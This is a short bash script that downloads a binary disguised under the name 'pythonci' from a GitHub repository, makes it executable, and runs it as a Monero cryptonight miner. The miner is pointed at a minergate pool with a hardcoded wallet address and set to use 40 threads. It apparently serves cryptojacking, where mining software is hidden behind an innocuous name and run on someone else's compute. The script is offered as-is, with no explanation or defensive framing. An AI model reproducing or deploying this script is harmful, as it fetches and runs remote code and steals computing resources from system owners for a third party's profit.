#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://xmr.pool.minergate.com:45560
WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1FBABdbXtwbWCgk8DkStvmj   
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40
